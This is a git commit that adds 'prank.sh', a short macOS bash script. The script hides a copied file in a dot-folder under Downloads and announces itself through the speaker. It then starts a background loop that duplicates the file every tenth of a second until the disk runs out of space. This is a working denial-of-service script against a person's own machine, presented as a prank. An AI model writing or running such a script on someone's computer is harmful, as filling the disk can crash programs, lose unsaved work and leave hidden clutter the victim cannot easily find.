690a4304250a88413f8433ce49e0c1b6ecf33c57
KARAN <143735873+punkkkkkkk@users.noreply.github.com>
2025-08-02 18:50:18 +0530

    Create prank.sh

---
+++ prank.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+
+PAYLOAD="$1"
+mkdir -p ~/Downloads/.dingdong
+cp "$PAYLOAD" ~/Downloads/.dingdong/.hidden.jpg
+
+osascript -e "set volume output volume 80"
+say "Ding dong. Let's play a game."
+
+(
+i=0
+while true; do
+    cp ~/Downloads/.dingdong/.hidden.jpg ~/Downloads/.dingdong/copy_$i.jpg 2>/dev/null
+    if [ $? -ne 0 ]; then
+        say "No more space left. I'm done."
+        break
+    fi
+    i=$((i + 1))
+    sleep 0.1
+done
+) &
